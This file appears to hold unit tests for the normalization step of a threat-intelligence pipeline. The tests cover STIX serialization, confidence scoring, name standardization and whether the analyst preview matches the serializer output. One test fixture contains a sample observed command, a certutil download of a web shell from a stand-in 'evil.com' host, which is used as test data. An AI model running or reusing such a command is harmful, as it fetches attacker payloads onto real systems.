"""Unit tests for the normalize node."""

import copy
from unittest.mock import AsyncMock, patch

import pytest
from dataclasses import asdict

from app.graph.state import (
    PipelineStatus,
    TechniqueMapping,
)
from app.nodes.deterministic.serialization import serialize_stix
from app.nodes.deterministic.normalization import (
    normalize,
    _standardize_names,
    _assess_context_completeness,
    WEIGHT_SOURCE_RELIABILITY,
    WEIGHT_CONTEXT_COMPLETENESS,
    WEIGHT_BEHAVIORAL_CONFIDENCE,
)


# ── normalize node function ───────────────────────────────────────


class TestNormalize:
    """Tests for the top-level LangGraph node function."""

    def test_filters_to_approved_drafts(self, sample_drafts):
        """Only approved drafts appear in normalized output."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001", "dft-003"],  # skip dft-002
            "source_reliability": 85,
        }
        result = normalize(state)

        assert result["status"] == PipelineStatus.NORMALIZING.value
        assert result["current_node"] == "normalize"
        ids = [d["draft_id"] for d in result["normalized_drafts"]]
        assert "dft-001" in ids
        assert "dft-003" in ids
        assert "dft-002" not in ids

    def test_all_drafts_approved(self, sample_drafts):
        """All three sample drafts appear when all are approved."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001", "dft-002", "dft-003"],
            "source_reliability": 85,
        }
        result = normalize(state)
        assert len(result["normalized_drafts"]) == 3

    def test_no_approved_drafts(self, sample_drafts):
        """Empty approved list returns empty normalized_drafts."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [],
            "source_reliability": 85,
        }
        result = normalize(state)

        assert result["normalized_drafts"] == []
        assert result["status"] == PipelineStatus.NORMALIZING.value

    def test_composite_confidence_present(self, sample_drafts):
        """Every normalized draft has a composite_confidence score."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
            "source_reliability": 85,
        }
        result = normalize(state)

        for nd in result["normalized_drafts"]:
            assert "composite_confidence" in nd
            assert 0 <= nd["composite_confidence"] <= 100

    def test_confidence_breakdown_structure(self, sample_drafts):
        """Confidence breakdown contains expected keys."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001"],
            "source_reliability": 85,
        }
        result = normalize(state)

        bd = result["normalized_drafts"][0]["confidence_breakdown"]
        assert bd["source_reliability"] == 85
        assert "context_completeness" in bd
        assert "behavioral_confidence" in bd
        assert "weights" in bd
        assert bd["weights"]["source_reliability"] == WEIGHT_SOURCE_RELIABILITY

    def test_standardized_names_present(self, sample_drafts):
        """Normalized drafts include standardized_names dict."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
            "source_reliability": 85,
        }
        result = normalize(state)

        for nd in result["normalized_drafts"]:
            assert "standardized_names" in nd

    def test_source_reliability_affects_confidence(self, sample_drafts):
        """Higher source_reliability increases composite confidence."""
        draft_ids = [d["draft_id"] for d in sample_drafts]

        state_low = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": draft_ids,
            "source_reliability": 20,
        }
        state_high = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": draft_ids,
            "source_reliability": 95,
        }

        result_low = normalize(state_low)
        result_high = normalize(state_high)

        for i in range(len(result_low["normalized_drafts"])):
            assert (
                result_high["normalized_drafts"][i]["composite_confidence"]
                >= result_low["normalized_drafts"][i]["composite_confidence"]
            )


# ── _standardize_names ────────────────────────────────────────────


class TestStandardizeNames:
    """Tests for the name standardization function."""

    def test_powershell_normalization(self):
        """'powershell' -> 'PowerShell'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1059.001",
                    technique_name="powershell",
                    tactic="execution",
                    confidence=0.8,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("powershell") == "PowerShell"

    def test_cobalt_strike_normalization(self):
        """'cobalt strike' -> 'Cobalt Strike'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="S0154",
                    technique_name="cobalt strike",
                    tactic="command-and-control",
                    confidence=0.9,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("cobalt strike") == "Cobalt Strike"

    def test_already_canonical_no_mapping(self):
        """Already canonical names don't appear in mappings."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1190",
                    technique_name="Exploit Public-Facing Application",
                    tactic="initial-access",
                    confidence=0.85,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        # This name isn't in the canonical dict, so no mapping
        assert len(mappings) == 0

    def test_cmd_normalization(self):
        """'cmd' -> 'Windows Command Shell'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1059.003",
                    technique_name="cmd",
                    tactic="execution",
                    confidence=0.7,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("cmd") == "Windows Command Shell"

    def test_empty_techniques(self):
        """Draft with no techniques produces empty mappings."""
        draft = {"techniques": [], "platforms": []}
        mappings = _standardize_names(draft)
        assert mappings == {}


# ── _assess_context_completeness ──────────────────────────────────


class TestAssessContextCompleteness:
    """Tests for the context completeness scorer."""

    def test_full_context_high_score(self):
        """A well-populated draft gets a high score."""
        draft = {
            "description": "The actor exploited CVE-2023-46604 to gain initial "
                           "access via Apache ActiveMQ. The exploit leveraged "
                           "ClassInfo deserialization to execute shell commands.",
            "raw_command_lines": ["certutil.exe -urlcache -split -f http://evil.com/shell.jsp"],
            "techniques": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application"},
                {"technique_id": "T1059.003", "technique_name": "Windows Command Shell"},
            ],
            "first_observed": "2023-10-25T00:00:00Z",
            "source_refs": ["identity--abc123"],
            "platforms": ["windows::server"],
            "detail_gap": False,
        }
        score = _assess_context_completeness(draft)
        # description >100 chars = 25, cmd_lines = 25, 2 techniques = 20,
        # first_observed = 10, source_refs = 10, platforms = 5, no detail_gap = 5
        assert score == 100

    def test_empty_draft_low_score(self):
        """An empty draft scores only the no-detail-gap bonus (5)."""
        draft = {}
        score = _assess_context_completeness(draft)
        # Empty dict: detail_gap defaults to False -> +5
        assert score == 5

    def test_description_only_partial(self):
        """Short description gets partial credit + no-detail-gap bonus."""
        draft = {"description": "Actor exploited a vulnerability."}
        score = _assess_context_completeness(draft)
        # 30 < len(34) < 100 -> 15 points + no detail_gap -> +5 = 20
        assert score == 20

    def test_detail_gap_penalty(self):
        """detail_gap=True removes the 5-point bonus."""
        draft_no_gap = {
            "description": "Some description that is moderately long for testing purposes.",
            "detail_gap": False,
        }
        draft_with_gap = {
            "description": "Some description that is moderately long for testing purposes.",
            "detail_gap": True,
        }
        score_no = _assess_context_completeness(draft_no_gap)
        score_yes = _assess_context_completeness(draft_with_gap)
        assert score_no == score_yes + 5

    def test_command_lines_boost(self):
        """Having command lines adds 25 points."""
        base = {"description": "x" * 101}  # 25 pts
        with_cmd = {**base, "raw_command_lines": ["whoami"]}
        assert _assess_context_completeness(with_cmd) - _assess_context_completeness(base) == 25


class TestPreviewMatchesSerializer:
    """Gate 2 must show the analyst what will actually ship.

    The preview and the serializer build their edge lists independently, and
    they had drifted in both directions: the preview fanned malware/tools out
    to every procedure whose `*_used` list was empty (edges the serializer
    would never emit), while six intrusion-set/campaign classes shipped with
    no preview at all. Scope here is the tool/malware classes the fan-out
    affected — the ones where an analyst decision is meaningful.
    """

    @staticmethod
    def _state(sample_entities, sample_drafts):
        return {
            "gates_enabled": True,
            "metadata": {},
            "source_reliability": 85,
            "validated_entities": copy.deepcopy(sample_entities),
            "drafts": copy.deepcopy(sample_drafts),
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
        }

    @staticmethod
    def _tool_malware_keys_from_preview(preview):
        return {
            (r["source_name"].lower(), r["target_name"].lower(), r["target_type"])
            for r in preview
            if r["source_type"] == "x-procedure"
            and r["target_type"] in ("tool", "malware")
        }

    @staticmethod
    def _tool_malware_keys_from_bundle(bundle):
        by_id = {o["id"]: o for o in bundle["objects"]}
        keys = set()
        for o in bundle["objects"]:
            if o.get("type") != "relationship" or o["relationship_type"] != "uses":
                continue
            src, tgt = by_id.get(o["source_ref"], {}), by_id.get(o["target_ref"], {})
            if src.get("type") == "x-procedure" and tgt.get("type") in ("tool", "malware"):
                keys.add((
                    (src.get("name") or "").lower(),
                    (tgt.get("name") or "").lower(),
                    tgt["type"],
                ))
        return keys

    async def test_preview_shows_no_edge_the_serializer_will_not_emit(
        self, sample_entities, sample_drafts,
    ):
        """No fiction: an analyst must not review an edge that cannot ship."""
        state = self._state(sample_entities, sample_drafts)
        state = {**state, **normalize(state)}
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]

        previewed = self._tool_malware_keys_from_preview(
            state["relationship_preview"],
        )
        shipped = self._tool_malware_keys_from_bundle(bundle)
        assert previewed - shipped == set(), (
            "preview promises tool/malware edges the serializer never emits"
        )

    async def test_serializer_emits_no_tool_edge_the_preview_hid(
        self, sample_entities, sample_drafts,
    ):
        """And the reverse: nothing ships that the analyst never saw."""
        state = self._state(sample_entities, sample_drafts)
        state = {**state, **normalize(state)}
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]

        previewed = self._tool_malware_keys_from_preview(
            state["relationship_preview"],
        )
        shipped = self._tool_malware_keys_from_bundle(bundle)
        assert shipped - previewed == set(), (
            "serializer ships tool/malware edges absent from the gate 2 preview"
        )

    def test_empty_tools_used_previews_no_tool_edges(
        self, sample_entities, sample_drafts,
    ):
        """The fan-out itself: empty means empty, not 'every tool in the source'.

        On one campaign source this branch put
        'Harvest Credentials via Voice Phishing --uses--> GNU shred'
        in front of the analyst.
        """
        drafts = copy.deepcopy(sample_drafts)
        for d in drafts:
            d["tools_used"] = []
            d["malware_used"] = []
        state = self._state(sample_entities, drafts)
        preview = normalize(state)["relationship_preview"]
        assert self._tool_malware_keys_from_preview(preview) == set()
